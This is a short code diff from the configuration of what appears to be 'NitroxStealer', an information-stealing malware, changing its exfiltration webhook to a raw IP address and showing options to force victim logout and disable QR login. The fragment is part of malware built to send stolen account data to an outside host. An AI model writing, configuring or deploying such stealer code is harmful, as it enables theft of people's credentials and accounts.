@@ -13,7 +13,7 @@ const fs = require("fs");
 var config = {
     brand: "NitroxStealer",
 
-    webhook: "http://185.98.138.23:3000",
+    webhook: "http://185.98.138.23/nitrox_api/api.js:3000",
 
     logout: true,
     disable_qr_code: true,
